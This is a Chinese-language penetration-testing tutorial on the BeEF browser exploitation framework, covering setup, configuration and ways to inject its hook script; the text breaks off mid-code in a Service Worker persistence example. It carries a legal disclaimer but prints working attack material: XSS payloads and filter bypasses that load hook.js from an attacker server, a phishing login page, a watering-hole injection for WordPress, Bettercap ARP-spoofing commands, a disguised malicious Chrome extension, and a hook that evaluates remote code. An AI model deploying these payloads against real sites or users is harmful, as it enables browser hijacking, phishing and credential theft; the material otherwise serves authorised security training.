# BeEF浏览器攻击框架实战

> **声明**：本文档仅供网络安全学习与研究使用。任何利用本文内容进行的未经授权的攻击行为均属违法，使用者需自行承担法律责任。请在获得明确授权的测试环境中进行实验。

---

## 目录

- [第1章 BeEF概述](#第1章-beef概述)
- [第2章 BeEF环境搭建](#第2章-beef环境搭建)
- [第3章 钩子（Hook）技术详解](#第3章-钩子hook技术详解)
- [第4章 BeEF核心功能模块](#第4章-beef核心功能模块)
- [第5章 高级模块使用](#第5章-高级模块使用)
- [第6章 实战案例](#第6章-实战案例)
- [第7章 BeEF扩展开发](#第7章-beef扩展开发)
- [第8章 检测与防御](#第8章-检测与防御)
- [第9章 工具与资源](#第9章-工具与资源)

---

## 第1章 BeEF概述

### 1.1 什么是BeEF

BeEF（Browser Exploitation Framework，浏览器利用框架）是一款专注于Web浏览器层面的渗透测试工具，由Wade Alcorn于2006年创建，目前由BeEF项目团队持续维护。与传统的针对操作系统或应用程序的漏洞利用框架不同，BeEF将攻击面聚焦于Web浏览器这一用户日常接触最多的软件。

BeEF的核心理念是：**浏览器是连接用户与互联网的桥梁，也是攻击者进入目标系统的重要入口**。通过在目标浏览器中植入一个被称为"Hook"（钩子）的JavaScript脚本，攻击者可以远程控制浏览器，执行各种信息收集、社会工程、网络侦察甚至代码执行操作。

BeEF是一个开源项目，基于Ruby语言开发，采用客户端-服务器架构。它的官方网站是 https://beefproject.com/，源代码托管在GitHub上。BeEF遵循AGPL-3.0许可证。

**BeEF的主要特点：**

- **跨平台性**：无论目标使用Windows、macOS、Linux还是移动设备，只要使用浏览器，就可能被Hook
- **模块化架构**：功能以模块形式存在，目前内置超过200个功能模块
- **Web管理界面**：通过浏览器即可管理所有被Hook的主机和执行模块
- **易于扩展**：支持自定义模块开发，社区活跃
- **社会工程集成**：内置多种社会工程攻击向量
- **Metasploit集成**：可与Metasploit框架无缝配合

### 1.2 BeEF的架构与工作原理

BeEF采用典型的C/S（客户端/服务器）架构，主要由以下几个核心组件构成：

```
┌─────────────────────────────────────────────────────────────┐
│                     BeEF Server (Ruby)                      │
│  ┌─────────────┐  ┌─────────────┐  ┌───────────────────┐   │
│  │  Admin UI   │  │  REST API   │  │  Command Modules  │   │
│  └─────────────┘  └─────────────┘  └───────────────────┘   │
│  ┌──────────────────────────────────────────────────────┐  │
│  │                  Hook Server (HTTP/HTTPS)            │  │
│  └──────────────────────────────────────────────────────┘  │
│  ┌──────────────────────────────────────────────────────┐  │
│  │                  Database (SQLite/PostgreSQL)        │  │
│  └──────────────────────────────────────────────────────┘  │
└──────────────────────────┬──────────────────────────────────┘
                           │ HTTP/WebSocket
                           ▼
┌─────────────────────────────────────────────────────────────┐
│                  Victim's Browser                           │
│  ┌──────────────────────────────────────────────────────┐  │
│  │                    Hook.js (JavaScript)              │  │
│  │  - 心跳通信                                          │  │
│  │  - 命令执行                                          │  │
│  │  - 结果回传                                          │  │
│  │  - 模块加载                                          │  │
│  └──────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

**核心组件说明：**

1. **BeEF服务器（BeEF Server）**
   - 基于Ruby和Sinatra框架构建
   - 负责管理所有Hook连接
   - 存储命令和结果数据
   - 提供Web管理界面和REST API

2. **Hook脚本（Hook.js）**
   - 一段JavaScript代码，需要注入到目标浏览器中
   - 与BeEF服务器保持心跳连接
   - 接收并执行服务器下发的命令
   - 将执行结果回传给服务器

3. **管理界面（Admin UI）**
   - 基于Web的图形化管理界面
   - 显示所有在线的Hooked浏览器
   - 提供模块选择和执行界面
   - 展示命令执行结果

4. **命令模块（Command Modules）**
   - BeEF功能的基本单位
   - 每个模块实现特定功能（信息收集、社会工程等）
   - 由Ruby服务端代码和JavaScript客户端代码组成
   - 按类别组织在不同目录下

**工作流程：**

1. 攻击者部署BeEF服务器
2. 通过各种方式（XSS、钓鱼、中间人等）将Hook.js注入目标浏览器
3. 目标浏览器加载Hook.js后，主动连接BeEF服务器
4. 服务器将该浏览器加入在线僵尸列表
5. 攻击者通过管理界面选择模块并下发命令
6. Hook.js执行命令并将结果回传

### 1.3 BeEF与社会工程学的关系

BeEF与社会工程学有着密不可分的联系。从某种意义上说，BeEF本身就是一个社会工程学的强力工具。

**为什么说BeEF是社会工程学工具？**

1. **初始访问依赖社工**：要Hook目标浏览器，通常需要利用社会工程学手段（钓鱼邮件、恶意链接、水坑攻击等）诱导用户访问包含Hook脚本的页面。纯粹的技术漏洞（如XSS）也常与社工结合使用。

2. **核心攻击向量是社工**：BeEF中最强大、最常用的模块大多属于社会工程范畴——假更新弹窗、假登录页面、点击劫持、剪贴板劫持等。这些模块不利用技术漏洞，而是利用人的心理弱点。

3. **攻击效果取决于用户交互**：BeEF的许多高级功能（如获取系统权限）需要用户进行特定操作（点击、下载、运行），这些操作的达成高度依赖社会工程学技巧。

**社会工程学在BeEF攻击链中的角色：**

```
信息收集 → 制作诱饵（社工）→ 诱导访问（社工）→ Hook植入 → 信息收集
     ↑                                                    ↓
     └──────── 权限提升/凭证获取（社工模块） ←─────────── 模块执行
```

**典型应用场景：**

- **钓鱼攻击增强**：在钓鱼页面中植入Hook，即使用户没有输入凭证，也能获取浏览器信息并进行后续攻击
- **水坑攻击**：攻陷目标常访问的网站，植入Hook脚本
- **内部威胁模拟**：模拟员工点击恶意链接后的浏览器级渗透
- **安全意识培训**：展示点击可疑链接可能带来的危害

### 1.4 应用场景与法律边界

#### 合法应用场景

1. **授权渗透测试**：在获得客户书面授权的前提下，对目标系统进行Web层面的渗透测试
2. **红队演练**：企业内部红队/蓝队对抗演练，测试员工安全意识和防御体系
3. **安全研究**：研究浏览器安全、Web攻击技术和防御方法
4. **安全意识培训**：在受控环境中演示攻击危害，提升员工安全意识
5. **产品安全测试**：测试Web应用和浏览器插件的安全性

#### 法律风险与边界

**重要提醒：未经授权使用BeEF攻击他人浏览器是违法行为！**

可能涉及的法律法规：

- **中国**：《网络安全法》、《刑法》第285条（非法侵入计算机信息系统罪）、第286条（破坏计算机信息系统罪）
- **美国**：Computer Fraud and Abuse Act (CFAA)
- **欧盟**：NIS Directive、GDPR
- **国际**： Budapest Convention on Cybercrime

**法律红线：**

1. 不得对未授权的系统使用BeEF
2. 不得利用BeEF窃取他人数据
3. 不得利用BeEF进行破坏活动
4. 不得将BeEF用于任何非法目的
5. 即使在授权测试中，也应遵守测试范围和时间窗口

**建议做法：**

- 始终获取书面授权
- 明确测试范围和边界
- 遵守当地法律法规
- 使用隔离的实验环境进行学习和研究
- 做好日志记录和事后清理

### 1.5 BeEF vs Metasploit的区别与配合

BeEF和Metasploit都是著名的渗透测试框架，但它们的定位和侧重点有很大不同。

| 对比维度 | BeEF | Metasploit |
|---------|------|------------|
| **攻击层面** | 应用层（浏览器） | 系统层（操作系统） |
| **主要目标** | Web浏览器 | 操作系统、服务、应用 |
| **开发语言** | Ruby + JavaScript | Ruby |
| **攻击方式** | 浏览器Hook + 模块 | 漏洞利用 + Payload |
| **权限级别** | 浏览器权限 | 系统权限（取决于漏洞） |
| **社会工程** | 深度集成 | 有部分社工模块 |
| **典型场景** | Web渗透、社工攻击 | 系统渗透、内网渗透 |
| **被控端** | Hook.js（JS脚本） | Meterpreter等Payload |
| **通信方式** | HTTP/WebSocket | TCP/UDP/HTTP等多种 |

**两者的互补关系：**

BeEF和Metasploit并非竞争关系，而是互补关系。在实际渗透测试中，两者经常配合使用：

```
第一阶段：BeEF主导（浏览器层面）
├── 利用XSS/社工Hook目标浏览器
├── 收集浏览器和系统信息
├── 内网侦察（通过浏览器探测内网）
└── 社会工程攻击获取凭证或下载执行

第二阶段：Metasploit介入（系统层面）
├── 利用BeEF收集的信息选择合适的Exploit
├── 通过BeEF传送Metasploit Payload
├── 获取Meterpreter会话
└── 内网渗透、权限提升、横向移动
```

**具体配合方式：**

1. **BeEF调用Metasploit模块**：BeEF内置Metasploit集成功能，可以直接在BeEF界面中使用Metasploit的Exploit模块

2. **浏览器自动投递Payload**：通过BeEF的社会工程模块，诱导用户下载并执行Metasploit生成的Payload

3. **信息共享**：BeEF收集的浏览器指纹、内网IP等信息可以辅助Metasploit选择更精准的攻击路径

4. **持久化配合**：BeEF提供浏览器层面的持久化，Metasploit提供系统层面的持久化，两者结合可以获得更稳固的访问

---

## 第2章 BeEF环境搭建

### 2.1 系统要求与依赖

#### 硬件要求

| 组件 | 最低配置 | 推荐配置 |
|------|---------|---------|
| CPU | 双核 2GHz | 四核 3GHz+ |
| 内存 | 2GB | 4GB+ |
| 硬盘 | 10GB可用空间 | 20GB+ SSD |
| 网络 | 稳定的网络连接 | 独立IP/公网服务器 |

#### 软件依赖

- **Ruby**：>= 2.7.x（推荐3.0+）
- **Node.js**：>= 10.x
- **SQLite 3**：默认数据库
- **PostgreSQL**（可选）：生产环境推荐
- **Git**：用于获取源码
- **Build Tools**：编译原生扩展所需

#### 支持的操作系统

- Kali Linux（官方推荐，预装BeEF）
- Ubuntu 20.04 / 22.04
- Debian 11 / 12
- macOS 11+
- Windows（通过WSL2或Docker）

### 2.2 BeEF安装

#### 方式一：Kali Linux（推荐初学者）

Kali Linux默认预装了BeEF，位置在 `/usr/share/beef-xss/`。

**启动步骤：**

```bash
# 1. 更新系统
sudo apt update && sudo apt upgrade -y

# 2. 安装BeEF（如果未预装）
sudo apt install beef-xss -y

# 3. 启动BeEF
sudo beef-xss

# 或者使用服务方式
sudo systemctl start beef-xss
```

> **截图位置说明**：启动成功后，终端会显示管理界面地址，通常是 `http://127.0.0.1:3000/ui/panel`。在浏览器中打开此地址，使用默认用户名 `beef` 和密码 `beef` 登录（首次启动会提示修改密码）。

**修改默认密码：**

```bash
# 编辑配置文件
sudo nano /etc/beef-xss/config.yaml

# 找到 credentials 部分，修改用户名和密码
# credentials:
#   user: "beef"
#   passwd: "your_secure_password"
```

#### 方式二：源码编译安装（最新版）

适合想要使用最新功能或进行开发的用户。

```bash
# 1. 安装依赖
sudo apt update
sudo apt install -y git ruby ruby-dev build-essential \
    libsqlite3-dev libssl-dev zlib1g-dev nodejs npm

# 2. 克隆源码
git clone https://github.com/beefproject/beef.git
cd beef

# 3. 安装Ruby依赖
gem install bundler
bundle install

# 4. 安装Node.js依赖（如需要）
npm install

# 5. 复制配置文件
cp config.yaml.example config.yaml

# 6. 修改默认密码
sed -i 's/passwd: "beef"/passwd: "your_secure_password"/' config.yaml

# 7. 启动BeEF
./beef
```

**常见问题：**

- 如果 `bundle install` 失败，尝试更新bundler：`gem update bundler`
- 如果缺少系统库，根据错误信息安装对应的 `-dev` 包
- 在中国大陆可以使用Ruby镜像源加速：`bundle config mirror.https://rubygems.org https://gems.ruby-china.com`

#### 方式三：Docker部署（最简单）

适合快速部署和隔离环境。

```bash
# 1. 拉取官方镜像
docker pull beefproject/beef

# 2. 启动容器（基本用法）
docker run -d \
  --name beef \
  -p 3000:3000 \
  -p 6789:6789 \
  -p 61985:61985 \
  -p 61986:61986 \
  beefproject/beef

# 3. 查看日志获取密码
docker logs beef | grep "password"

# 4. 使用自定义配置
docker run -d \
  --name beef \
  -v /path/to/config.yaml:/beef/config.yaml \
  -p 3000:3000 \
  beefproject/beef
```

**Docker Compose方式：**

```yaml
# docker-compose.yml
version: '3'
services:
  beef:
    image: beefproject/beef
    container_name: beef
    ports:
      - "3000:3000"
      - "6789:6789"
      - "61985:61985"
      - "61986:61986"
    volumes:
      - ./config.yaml:/beef/config.yaml
      - beef-data:/beef/db
    restart: unless-stopped

volumes:
  beef-data:
```

启动：`docker-compose up -d`

### 2.3 配置文件详解（config.yaml）

BeEF的主配置文件是 `config.yaml`，位于安装根目录下。以下是关键配置项的详细说明。

#### 基本配置

```yaml
# BeEF监听地址和端口
beef:
    version: '0.5.4.0'
    listen: '0.0.0.0'       # 监听地址，0.0.0.0表示所有接口
    http_port: '3000'       # HTTP端口
    https_port: '6789'      # HTTPS端口
    public: '0.0.0.0'       # 公网地址（用于Hook回调）
    public_port: '3000'     # 公网端口
```

#### 管理员凭证

```yaml
    credentials:
        user:   'beef'          # 管理员用户名
        passwd: 'beef'          # 管理员密码（务必修改！）
        realm:  'BeEF Panel'    # HTTP Basic Auth领域
```

> **安全提示**：生产环境务必修改默认密码，并使用强密码策略。

#### HTTPS配置

```yaml
    https:
        enable: true            # 启用HTTPS
        key:    'https.key'     # 私钥文件路径
        cert:   'https.crt'     # 证书文件路径
```

#### 数据库配置

默认使用SQLite，生产环境建议使用PostgreSQL。

```yaml
    db:
        file:   'db/beef.db'    # SQLite数据库文件路径
        # PostgreSQL配置示例：
        # adapter: postgresql
        # database: beef
        # username: beef
        # password: beef
        # host: localhost
        # port: 5432
```

#### 管理员界面配置

```yaml
    admin_ui:
        enable: true
        base: '/ui'
        panel: 'panel'
        ssl_disabled: false     # 是否允许HTTP访问管理界面
```

#### RESTful API配置

```yaml
    rest:
        api:
            enable: true
            base: '/api'
            version: 'v1'
```

#### 模块配置

```yaml
    modules:
        # 模块路径
        path: ['modules']
        
        # 禁用特定模块
        disable: []
        
        # 自动加载模块
        autoload: true
```

#### 扩展配置

```yaml
    extensions:
        # 启用的扩展
        admins:
            enable: true
        events:
            enable: true
        # Metasploit集成（需单独配置）
        metasploit:
            enable: false
        # DNS代理
        dns:
            enable: false
        # 代理功能
        proxy:
            enable: false
```

#### 钩子（Hook）配置

```yaml
    hook:
        # Hook.js的URL路径
        file: '/hook.js'
        
        # 心跳间隔（秒）
        hb_timeout: 2
        
        # 连接超时（秒）
        hb_loop_timeout: 60
        
        # WebSocket支持
        ws:
            enable: true
            port: 61985
            secure_port: 61986
```

### 2.4 启动与初始化

#### 首次启动

```bash
# 进入BeEF目录
cd /usr/share/beef-xss/    # Kali Linux
# 或
cd ~/beef                   # 源码安装

# 启动BeEF
./beef
```

启动成功后，你将看到类似以下输出：

```
[11:22:33][*] Browser Exploitation Framework (BeEF)
[11:22:33]    |   Version 0.5.4.0
[11:22:33]    |   Website: https://beefproject.com
[11:22:33]    |   Follows us on Twitter @beefproject
[11:22:33]    |_  Run 'beef -h' for basic help.
[11:22:33][*] BeEF is loading. Wait a few seconds...
[11:22:35][*] 200 modules enabled.
[11:22:35][*] 3 extensions enabled.
[11:22:35][*] 2 network interfaces were detected.
[11:22:35][+] running on network interface: 127.0.0.1
[11:22:35]    |   Hook URL: http://127.0.0.1:3000/hook.js
[11:22:35]    |_  UI URL:   http://127.0.0.1:3000/ui/panel
[11:22:35][+] running on network interface: 192.168.1.100
[11:22:35]    |   Hook URL: http://192.168.1.100:3000/hook.js
[11:22:35]    |_  UI URL:   http://192.168.1.100:3000/ui/panel
[11:22:35][*] RESTful API: http://127.0.0.1:3000/api
[11:22:35][*] Waiting for connections...
```

记下两个关键URL：
- **Hook URL**：`http://<ip>:3000/hook.js` —— 这是需要注入目标浏览器的脚本地址
- **UI URL**：`http://<ip>:3000/ui/panel` —— 这是管理面板地址

#### 常用启动参数

```bash
# 查看帮助
./beef -h

# 指定配置文件
./beef -c /path/to/config.yaml

# 前台运行（调试模式）
./beef -f

# 指定日志文件
./beef -l /path/to/beef.log

# 重置数据库
./beef -x

# 详细输出
./beef -v
```

### 2.5 Web管理界面介绍

#### 登录界面

在浏览器中访问管理面板地址（如 `http://127.0.0.1:3000/ui/panel`），首先看到的是登录界面。

> **截图位置说明**：登录界面为简洁的BeEF风格，包含用户名和密码输入框。输入在配置文件中设置的凭证后点击Login按钮。

#### 主界面布局

BeEF管理界面主要分为以下区域：

```
┌─────────────────────────────────────────────────────────────────┐
│  BeEF Logo  |  Online: 2  |  Logged: 5  |  Current: admin      │
├──────────────┬───────────────────┬──────────────────────────────┤
│              │                   │                              │
│  Hooked      │   Details of     │   Command                    │
│  Browsers    │   Selected       │   Modules                    │
│  (左栏)      │   Browser        │   (右栏)                     │
│              │   (中栏)         │                              │
│              │                   │                              │
│ - Zombie 1   │ Info tab         │ Module Categories            │
│ - Zombie 2   │ Logs tab         │  - Browser                   │
│   ...        │ Commands tab     │  - Network                   │
│              │ ...              │  - Social Engineering        │
│              │                   │  - ...                       │
└──────────────┴───────────────────┴──────────────────────────────┘
```

**左栏 - Hooked Browsers（已Hook浏览器列表）：**
- 显示所有当前在线和曾经连接过的浏览器
- 绿色：当前在线
- 灰色：已离线
- 每个条目显示：浏览器图标、IP地址、浏览器类型和版本、操作系统

**中栏 - 浏览器详情：**
- **Details**：详细的浏览器指纹信息
- **Logs**：该浏览器的活动日志
- **Commands**：已执行的命令和结果
- **Rider**：请求骑乘（Request Riding）功能
- **XssRays**：XSS扫描工具
- **Network**：网络信息

**右栏 - 命令模块：**
- 按类别组织的所有可用模块
- 点击模块可以查看描述和配置选项
- 点击"Execute"按钮在选中的浏览器上执行模块

> **截图位置说明**：成功登录后，主界面分为三栏。左栏列出所有被Hook的浏览器（初始为空），中栏显示选中浏览器的详细信息，右栏是功能模块树。

#### 测试Hook

为了验证BeEF是否正常工作，可以在本地测试Hook：

1. 启动BeEF，记录Hook URL（如 `http://127.0.0.1:3000/hook.js`）
2. 创建一个测试HTML文件：

```html
<!-- test-hook.html -->
<!DOCTYPE html>
<html>
<head>
    <title>BeEF Hook Test</title>
    <script src="http://127.0.0.1:3000/hook.js"></script>
</head>
<body>
    <h1>BeEF Hook Test Page</h1>
    <p>This page contains the BeEF hook script.</p>
</body>
</html>
```

3. 在浏览器中打开这个HTML文件
4. 回到BeEF管理界面，左栏应该出现一个新的Hooked Browser

> **截图位置说明**：在左栏的Hooked Browsers列表中，可以看到新添加的浏览器条目，显示浏览器图标、IP地址（127.0.0.1）、浏览器名称和版本、操作系统信息。点击该条目，中栏会显示详细信息。

### 2.6 常见安装问题与解决

| 问题 | 可能原因 | 解决方案 |
|------|---------|---------|
| `bundle install` 失败 | 缺少编译依赖 | 安装 `build-essential` 和对应开发库 |
| 启动后无法访问 | 防火墙阻止 | 开放3000端口：`ufw allow 3000` |
| 密码不正确 | 配置文件未正确修改 | 检查config.yaml中的credentials部分 |
| 数据库错误 | 数据库文件损坏 | 删除db目录后重启：`rm -rf db/` |
| 模块加载失败 | 缺少依赖模块 | 运行 `bundle install` 确保所有gem已安装 |
| 中文乱码 | 字符编码问题 | 确保系统locale设置为UTF-8 |
| Docker容器无法启动 | 端口被占用 | 更换映射端口或停止占用端口的服务 |
| Hook.js加载失败 | 跨域问题 | 确保BeEF服务器可被目标浏览器访问 |
| 连接频繁断开 | 心跳超时 | 检查网络稳定性，调整hb_timeout设置 |

---

## 第3章 钩子（Hook）技术详解

### 3.1 Hook的工作原理

BeEF Hook是整个框架的核心，它是一段JavaScript代码（通常称为hook.js），当被注入到目标浏览器中后，会建立起目标浏览器与BeEF服务器之间的通信通道。

#### Hook.js的核心功能

1. **初始化与注册**：加载后立即向BeEF服务器注册，获取唯一的会话ID（BeEF Hook ID）
2. **心跳通信**：定期向服务器发送心跳包，维持在线状态
3. **命令轮询**：检查是否有新的命令需要执行
4. **命令执行**：执行服务器下发的JavaScript命令
5. **结果回传**：将命令执行结果发送回服务器
6. **模块加载**：按需加载额外的功能模块代码

#### 通信机制

BeEF支持多种通信方式，优先级从高到低：

1. **WebSocket**（推荐）：双向实时通信，延迟低
2. **XMLHttpRequest轮询**：传统AJAX轮询
3. **跨域资源共享（CORS）**：用于跨域场景
4. **JSONP**：旧版浏览器兼容

**心跳机制工作流程：**

```
  Hook.js (Browser)              BeEF Server
       |                              |
       |---- 初始注册请求 ----------->|
       |                              |
       |<--- 返回hook_session_id ----|
       |                              |
       |                              |
       |---- 心跳 / 拉取命令 -------->|
       |                              |
       |<--- 命令列表（可能为空）-----|
       |                              |
       |-- 执行命令 --|               |
       |              |               |
       |---- 结果回传 -------------->|
       |                              |
       |---- 心跳 / 拉取命令 -------->|
       |                              |
       ...                            ...
```

#### Hook会话标识

每个被Hook的浏览器都会被分配一个唯一的会话标识，存储在浏览器的Cookie中（默认名为 `BEEFHOOK`）。即使页面刷新或跳转，只要Cookie还在，BeEF就能识别出是同一个浏览器。

### 3.2 多种Hook注入方式

要让BeEF发挥作用，第一步就是将Hook.js注入到目标浏览器中。以下是常见的注入方式。

#### 方式一：XSS注入钩子

跨站脚本攻击（XSS）是注入BeEF Hook最经典的方式。当目标网站存在XSS漏洞时，可以将Hook脚本注入到页面中。

**反射型XSS注入示例：**

```
http://vulnerable-site.com/search?q=<script src="http://beef-server:3000/hook.js"></script>
```

**存储型XSS注入示例：**

在评论框、用户资料等可持久化输入的位置提交：

```html
<script src="http://beef-server:3000/hook.js"></script>
```

**DOM型XSS注入：**

通过操纵URL参数或DOM结构触发。

**绕过XSS过滤器的常见手法：**

```html
<!-- 1. 使用不同的标签 -->
<img src=x onerror="s=document.createElement('script');s.src='http://beef:3000/hook.js';document.body.appendChild(s)">

<!-- 2. 编码绕过 -->
<script src=//beef-server:3000/hook.js></script>

<!-- 3. 事件触发 -->
<body onload="document.body.appendChild(document.createElement('script')).src='http://beef:3000/hook.js'">

<!-- 4. SVG注入 -->
<svg onload="document.body.appendChild(document.createElement('script')).src='http://beef:3000/hook.js'">
```

> **截图位置说明**：在BeEF管理界面的"Module Tree" -> "XSS"分类下，可以找到各种XSS相关的辅助模块，包括XssRays自动扫描工具。

#### 方式二：水坑攻击注入

水坑攻击（Watering Hole Attack）是指攻击者攻陷目标人群经常访问的网站，在其中植入恶意代码。

**实施步骤：**

1. **信息收集**：确定目标群体常访问的网站
2. **网站攻陷**：利用漏洞或社会工程手段获取网站控制权
3. **植入Hook**：在网站页面中添加Hook.js引用
4. **等待上钩**：目标访问网站时自动被Hook

**示例：在WordPress网站植入Hook**

如果攻陷了一个WordPress网站，可以在主题的header.php中添加：

```php
<!-- BeEF Hook -->
<script src="http://beef-server:3000/hook.js" type="text/javascript"></script>
```

或者通过插件方式注入。

#### 方式三：社会工程学注入（钓鱼页面）

这是最常用也最有效的方式之一，通过制作钓鱼页面诱导用户访问。

**常见场景：**

1. **仿冒登录页面**：制作与目标系统一模一样的登录页面，嵌入Hook脚本
2. **伪造文档页面**：声称是某个重要文档的在线查看页面
3. **有奖调查问卷**：以奖励为诱饵吸引用户填写
4. **软件下载页**：提供"破解软件"、"免费工具"等下载

**示例：简单钓鱼页面**

```html
<!DOCTYPE html>
<html>
<head>
    <title>员工登录 - XX公司</title>
    <meta charset="UTF-8">
    <!-- BeEF Hook -->
    <script src="http://your-beef-server:3000/hook.js"></script>
    <style>
        /* 仿冒目标登录页面样式 */
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .login-box { width: 300px; margin: 100px auto; padding: 30px; 
                     background: white; border-radius: 5px; 
                     box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; 
                border: 1px solid #ddd; border-radius: 3px; }
        button { width: 100%; padding: 10px; background: #007bff; 
                 color: white; border: none; border-radius: 3px; 
                 cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>员工邮箱登录</h2>
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="邮箱地址" required>
            <input type="password" name="password" placeholder="密码" required>
            <button type="submit">登录</button>
        </form>
    </div>
</body>
</html>
```

> **截图位置说明**：在BeEF的"Social Engineering"模块分类下，有多个预制的钓鱼页面模板，如"Pretty Theft"、"Fake Notification Bar"等，可以直接使用。

#### 方式四：中间人攻击注入

在中间人（MITM）攻击场景中，攻击者可以拦截并修改HTTP流量，注入Hook脚本。

**常用工具配合：**

1. **Bettercap**：集成了BeEF注入功能
2. **MITMProxy**：通过脚本注入Hook
3. **Ettercap**：配合filter脚本

**Bettercap + BeEF示例：**

```bash
# 启动bettercap
bettercap -iface eth0

# 启用ARP欺骗
arp.spoof on

# 启用HTTP代理
http.proxy on

# 设置BeEF注入
set http.proxy.script /usr/share/bettercap/caplets/beefinject/beefinject.js
set beefinject.hook_url http://beef-server:3000/hook.js
```

#### 方式五：浏览器扩展注入

通过恶意浏览器扩展注入Hook脚本，这种方式隐蔽性高，持久化强。

**示例：Chrome扩展注入**

创建一个恶意扩展的 `manifest.json`：

```json
{
  "manifest_version": 2,
  "name": "Productivity Booster",
  "version": "1.0",
  "description": "提升您的浏览效率",
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["inject.js"],
      "run_at": "document_start"
    }
  ],
  "permissions": ["<all_urls>"]
}
```

`inject.js` 内容：

```javascript
(function() {
    var beefHost = 'http://beef-server:3000';
    var script = document.createElement('script');
    script.src = beefHost + '/hook.js';
    script.type = 'text/javascript';
    (document.head || document.documentElement).appendChild(script);
})();
```

### 3.3 Hook.js详解

#### Hook.js的核心结构

Hook.js是BeEF框架的客户端核心，其代码组织如下：

```javascript
// 核心命名空间
window.beef = {
    // 配置信息
    beefversion: '0.5.4.0',
    hookSessionId: null,
    browser: null,
    os: null,
    
    // 网络相关
    net: {
        request: function(url, handler, method, data, headers, timeout) { ... }
    },
    
    // 状态管理
    status: {
        isConnected: false,
        last_heartbeat: 0
    },
    
    // 命令执行
    do_stuff: function(cmds) { ... },
    execute: function(func, args) { ... },
    
    // 模块系统
    regCmp: function(mod_id, result) { ... },
    load: function(mod_path, cb) { ... },
    
    // 初始化
    init: function() { ... }
};
```

#### 关键函数解析

**1. 初始化函数 `beef.init()`**

```javascript
beef.init = function() {
    // 1. 浏览器指纹检测
    beef.browser = beef.browser.detect();
    beef.os = beef.os.detect();
    
    // 2. 获取或生成会话ID
    beef.hookSessionId = beef.cookie.get('BEEFHOOK');
    if (!beef.hookSessionId) {
        beef.hookSessionId = beef.generateId();
        beef.cookie.set('BEEFHOOK', beef.hookSessionId, 365);
    }
    
    // 3. 初始注册
    beef.net.request(beef.ajax + '/init', beef.init_callback, 'POST', 
        JSON.stringify({...}));
    
    // 4. 启动心跳
    beef.up();
};
```

**2. 心跳函数 `beef.up()`**

```javascript
beef.up = function() {
    // 定期向服务器发送心跳，拉取新命令
    beef.net.request(beef.ajax, function(response) {
        // 处理返回的命令列表
        if (response.cmds && response.cmds.length > 0) {
            beef.do_stuff(response.cmds);
        }
        // 继续下一次心跳
        setTimeout(beef.up, beef.hb);
    }, 'POST', JSON.stringify({...}));
};
```

**3. 命令执行 `beef.do_stuff(cmds)`**

```javascript
beef.do_stuff = function(cmds) {
    for (var i = 0; i < cmds.length; i++) {
        var cmd = cmds[i];
        // 动态加载模块代码
        if (cmd.hasOwnProperty('mod_path')) {
            beef.load(cmd.mod_path, function() {
                // 模块加载完成后执行
                beef.execute(cmd.handler, cmd.data);
            });
        } else {
            beef.execute(cmd.handler, cmd.data);
        }
    }
};
```

#### 自定义Hook脚本

在某些场景下，可能需要自定义Hook脚本，例如：

- 绕过WAF检测
- 添加额外的初始化逻辑
- 修改通信方式
- 混淆代码以躲避检测

**基本的最小化Hook示例：**

```javascript
(function() {
    var beefServer = 'http://beef-server:3000';
    var hookId = localStorage.getItem('beef_hook_id') || 
                 Math.random().toString(36).substring(7);
    localStorage.setItem('beef_hook_id', hookId);
    
    function heartbeat() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', beefServer + '/hook', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var response = JSON.parse(xhr.responseText);
                // 处理命令
                if (response.cmds) {
                    response.cmds.forEach(function(cmd) {
                        try { eval(cmd.code); } catch(e) {}
                    });
                }
                setTimeout(heartbeat, 2000);
            }
        };
        xhr.send(JSON.stringify({
            hook_id: hookId,
            browser: navigator.userAgent,
            url: window.location.href
        }));
    }
    
    heartbeat();
})();
```

> **注意**：以上仅为概念演示，实际的BeEF Hook.js功能要复杂得多，包含错误处理、模块加载系统、多种通信机制等。

### 3.4 持久化Hook技术

Hook的持久性是指，即使用户关闭当前页面或浏览其他页面，Hook仍然能够保持有效。

#### 持久化技术分类

| 技术 | 原理 | 持久化程度 | 隐蔽性 | 浏览器兼容性 |
|------|------|-----------|--------|-------------|
| Cookie持久化 | 用Cookie存储Hook ID | 中（用户可清除Cookie） | 高 | 所有浏览器 |
| Iframe嵌套 | 在iframe中保持连接 | 中（需同源） | 中 | 所有浏览器 |
| Window.open弹窗 | 弹出隐藏窗口 | 低（易被发现） | 低 | 受弹窗拦截限制 |
| LocalStorage | 用LocalStorage存储状态 | 中 | 高 | 现代浏览器 |
| Service Worker | 后台服务进程 | 高 | 高 | 现代浏览器（需HTTPS） |
| 浏览器扩展 | 通过扩展注入 | 最高 | 中 | 需安装扩展 |
| 历史记录API | 操纵浏览历史 | 低 | 中 | 现代浏览器 |

#### 常用持久化模块

BeEF内置了多个持久化模块，位于 "Persistence" 分类下：

1. **Confirm Close Tab**：当用户尝试关闭标签页时弹出确认对话框，延迟关闭时间
2. **Create Foreground Iframe**：在当前页面创建覆盖全屏的iframe，用户在新页面中浏览，原页面保持Hook
3. **Create Pop Under**：在当前窗口后面弹出一个新窗口，保持后台Hook
4. **Full Screen Iframe**：将当前页面替换为全屏iframe
5. **Intercept Link**：拦截页面上的所有链接点击，在后台保持连接

**示例：使用Create Foreground Iframe模块**

1. 在BeEF管理界面选择目标浏览器
2. 展开 "Persistence" -> "Create Foreground Iframe"
3. 配置参数：
   - **target**：要显示的目标URL（如用户原本要访问的页面）
4. 点击"Execute"执行

执行后，当前页面会被一个全屏的iframe覆盖，用户看到的是目标URL的内容，但实际的Hook连接在父页面中保持。

#### 进阶：Service Worker持久化

Service Worker是浏览器的后台脚本，可以在页面关闭后仍然运行一段时间，是最强的浏览器端持久化方式之一。

**示例概念代码：**

```javascript
// 注册Service Worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js').then(function(reg) {
        console.log('Service Worker registered');
    });
}

// sw.js - Service Worker脚本
self.addEventListener('fetch', function(event) {
    // 拦截请求，注入Hook
    event.respondWith(
        fetch(event.request).then(function(response) {
